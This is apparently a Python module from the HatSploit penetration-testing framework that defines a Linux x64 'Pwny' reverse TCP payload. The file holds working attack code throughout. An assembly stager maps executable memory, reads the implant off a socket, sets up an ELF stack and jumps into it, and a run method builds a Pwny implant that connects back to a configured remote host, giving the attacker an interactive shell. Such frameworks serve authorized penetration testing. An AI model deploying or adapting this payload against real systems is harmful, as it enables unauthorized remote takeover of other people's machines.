
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import io

from pwny import Pwny
from pwny.session import PwnySession

from elftools.elf.elffile import ELFFile

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Pwny Reverse TCP",
            'Payload': "linux/x64/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse Pwny shell for Linux
                with x64 architecture.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def stage(self):
        implant = self.implant()
        length = len(implant)
        entry = ELFFile(io.BytesIO(implant)).header['e_entry']

        return self.__asm__(
            f"""
            start:
                push rdi
                xor rdi, rdi
                mov rsi, {hex(length)}
                mov rdx, 0x7
                mov r10, 0x22
                xor r8, r8
                xor r9, r9
                mov rax, 0x9
                syscall

                mov rdx, rsi
                mov rsi, rax
                pop rdi
                mov r10, 0x100
                xor r8, r8
                xor r9, r9
                mov rax, 0x2d
                syscall

            #################################################
            ##
            ##    +----------------------------------+ low
            ##    |              ARGC                |
            ##    |----------------------------------|
            ##    |           ARGV[0] = p            |
            ##    |----------------------------------|
            ##    |         ARGV[1] = sock           |
            ##    |----------------------------------|
            ##    |         NULL (ends ARGV)         |
            ##    |----------------------------------|
            ##    |          ENV strings             |
            ##    |----------------------------------|
            ##    |         NULL (ends ENV)          |
            ##    |----------------------------------|
            ##    |           AT_BASE (7)            |
            ##    |----------------------------------|
            ##    |   address of pwny binary image   |
            ##    |----------------------------------|
            ##    |           AT_NULL (0)            |
            ##    |----------------------------------|
            ##    |         NULL (ends AUXV)         |
            ##    +----------------------------------+ high
            ##
            #################################################

                and rsp, -0x10
                add sp, 80
                mov rax, 0x70
                push rax
                mov rcx, rsp
                xor rbx, rbx
                push rbx
                push rbx
                push rsi
                mov rax, 7
                push rax
                push rbx
                push rbx
                push rdi
                push rcx
                mov rax, 2
                push rax

                mov rax, {hex(entry)}
                add rsi, rax
                jmp rsi
            """
        )

    def implant(self):
        return Pwny(
            target='x86_64-linux-musl',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='x86_64-linux-musl',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
